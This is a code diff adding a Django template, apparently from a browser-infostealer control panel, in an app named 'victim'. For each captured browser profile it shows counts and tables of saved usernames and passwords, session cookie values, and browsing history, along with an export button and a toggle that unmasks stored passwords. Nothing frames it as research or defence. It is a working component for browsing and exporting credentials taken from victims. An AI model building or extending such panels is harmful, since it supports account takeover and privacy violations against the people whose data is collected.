@@ -1,0 +1,263 @@
+{% extends 'victim/base.html' %}
+
+{% block title %}{{ profile.name }} - Profile Details{% endblock %}
+
+{% block content %}
+<div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
+    <h1 class="h2">
+        <i class="fas fa-user"></i> {{ profile.name }}
+        <span class="badge bg-primary ms-2">{{ profile.browser_type }}</span>
+    </h1>
+    <div class="btn-toolbar mb-2 mb-md-0">
+        <a href="{% url 'victim:export_profile_data' profile.id %}" class="btn btn-success">
+            <i class="fas fa-download"></i> Export Profile
+        </a>
+        <a href="{% url 'victim:profiles_list' %}" class="btn btn-outline-secondary ms-2">
+            <i class="fas fa-arrow-left"></i> Back to Profiles
+        </a>
+    </div>
+</div>
+
+<!-- Profile Info -->
+<div class="row mb-4">
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-body text-center">
+                {% if profile.profile_pic %}
+                    <img src="{{ profile.profile_pic.url }}" alt="Profile" class="rounded-circle mb-3" width="120" height="120">
+                {% else %}
+                    <div class="bg-secondary rounded-circle d-flex align-items-center justify-content-center mx-auto mb-3" style="width: 120px; height: 120px;">
+                        <i class="fas fa-user fa-3x text-white"></i>
+                    </div>
+                {% endif %}
+                <h5 class="card-title">{{ profile.name }}</h5>
+                <p class="text-muted">{{ profile.browser_type }}</p>
+                <small class="text-muted">Created: {{ profile.created_at|date:"M d, Y H:i" }}</small>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-8">
+        <div class="row">
+            <div class="col-md-4 mb-3">
+                <div class="card text-center">
+                    <div class="card-body">
+                        <h3 class="text-primary">{{ profile.passwords.count }}</h3>
+                        <p class="card-text">Passwords</p>
+                        <a href="{% url 'victim:passwords_list' %}?search={{ profile.name }}" class="btn btn-sm btn-outline-primary">View All</a>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4 mb-3">
+                <div class="card text-center">
+                    <div class="card-body">
+                        <h3 class="text-success">{{ profile.cookies.count }}</h3>
+                        <p class="card-text">Cookies</p>
+                        <a href="{% url 'victim:cookies_list' %}?search={{ profile.name }}" class="btn btn-sm btn-outline-success">View All</a>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4 mb-3">
+                <div class="card text-center">
+                    <div class="card-body">
+                        <h3 class="text-info">{{ profile.history.count }}</h3>
+                        <p class="card-text">History Entries</p>
+                        <a href="{% url 'victim:history_list' %}?search={{ profile.name }}" class="btn btn-sm btn-outline-info">View All</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Recent Data Tabs -->
+<ul class="nav nav-tabs" id="profileTabs" role="tablist">
+    <li class="nav-item" role="presentation">
+        <button class="nav-link active" id="passwords-tab" data-bs-toggle="tab" data-bs-target="#passwords" type="button" role="tab">
+            <i class="fas fa-key"></i> Recent Passwords
+        </button>
+    </li>
+    <li class="nav-item" role="presentation">
+        <button class="nav-link" id="cookies-tab" data-bs-toggle="tab" data-bs-target="#cookies" type="button" role="tab">
+            <i class="fas fa-cookie-bite"></i> Recent Cookies
+        </button>
+    </li>
+    <li class="nav-item" role="presentation">
+        <button class="nav-link" id="history-tab" data-bs-toggle="tab" data-bs-target="#history" type="button" role="tab">
+            <i class="fas fa-history"></i> Recent History
+        </button>
+    </li>
+</ul>
+
+<div class="tab-content" id="profileTabsContent">
+    <!-- Passwords Tab -->
+    <div class="tab-pane fade show active" id="passwords" role="tabpanel">
+        <div class="card mt-3">
+            <div class="card-header">
+                <h5 class="card-title mb-0">Recent Passwords</h5>
+            </div>
+            <div class="card-body">
+                {% if passwords %}
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead>
+                                <tr>
+                                    <th>Username</th>
+                                    <th>URL</th>
+                                    <th>Password</th>
+                                    <th>Created</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for password in passwords %}
+                                <tr>
+                                    <td><strong>{{ password.username }}</strong></td>
+                                    <td>
+                                        <a href="{{ password.url }}" target="_blank" class="text-decoration-none">
+                                            {{ password.url|truncatechars:40 }}
+                                        </a>
+                                    </td>
+                                    <td>
+                                        <div class="input-group">
+                                            <input type="password" class="form-control form-control-sm" value="{{ password.password }}" readonly>
+                                            <button class="btn btn-outline-secondary btn-sm" type="button" onclick="togglePassword(this)">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </td>
+                                    <td>{{ password.created_at|date:"M d, Y H:i" }}</td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                {% else %}
+                    <div class="text-center py-4">
+                        <i class="fas fa-key fa-2x text-muted mb-3"></i>
+                        <p class="text-muted">No passwords found for this profile.</p>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <!-- Cookies Tab -->
+    <div class="tab-pane fade" id="cookies" role="tabpanel">
+        <div class="card mt-3">
+            <div class="card-header">
+                <h5 class="card-title mb-0">Recent Cookies</h5>
+            </div>
+            <div class="card-body">
+                {% if cookies %}
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Host</th>
+                                    <th>Value</th>
+                                    <th>Secure</th>
+                                    <th>HttpOnly</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for cookie in cookies %}
+                                <tr>
+                                    <td><strong>{{ cookie.name }}</strong></td>
+                                    <td>{{ cookie.host_key }}</td>
+                                    <td>
+                                        <span class="text-muted">{{ cookie.value|truncatechars:30 }}</span>
+                                    </td>
+                                    <td>
+                                        {% if cookie.is_secure %}
+                                            <span class="badge bg-success">Yes</span>
+                                        {% else %}
+                                            <span class="badge bg-secondary">No</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        {% if cookie.is_httponly %}
+                                            <span class="badge bg-success">Yes</span>
+                                        {% else %}
+                                            <span class="badge bg-secondary">No</span>
+                                        {% endif %}
+                                    </td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                {% else %}
+                    <div class="text-center py-4">
+                        <i class="fas fa-cookie-bite fa-2x text-muted mb-3"></i>
+                        <p class="text-muted">No cookies found for this profile.</p>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <!-- History Tab -->
+    <div class="tab-pane fade" id="history" role="tabpanel">
+        <div class="card mt-3">
+            <div class="card-header">
+                <h5 class="card-title mb-0">Recent History</h5>
+            </div>
+            <div class="card-body">
+                {% if history %}
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead>
+                                <tr>
+                                    <th>Title</th>
+                                    <th>URL</th>
+                                    <th>Visit Count</th>
+                                    <th>Last Visit</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for entry in history %}
+                                <tr>
+                                    <td><strong>{{ entry.title|truncatechars:40 }}</strong></td>
+                                    <td>
+                                        <a href="{{ entry.url }}" target="_blank" class="text-decoration-none">
+                                            {{ entry.url|truncatechars:50 }}
+                                        </a>
+                                    </td>
+                                    <td>{{ entry.visit_count }}</td>
+                                    <td>{{ entry.last_visit_time|date:"M d, Y H:i" }}</td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                {% else %}
+                    <div class="text-center py-4">
+                        <i class="fas fa-history fa-2x text-muted mb-3"></i>
+                        <p class="text-muted">No history found for this profile.</p>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function togglePassword(button) {
+    const input = button.parentElement.querySelector('input');
+    const icon = button.querySelector('i');
+    
+    if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+    } else {
+        input.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+    }
+}
+</script>
+{% endblock %}
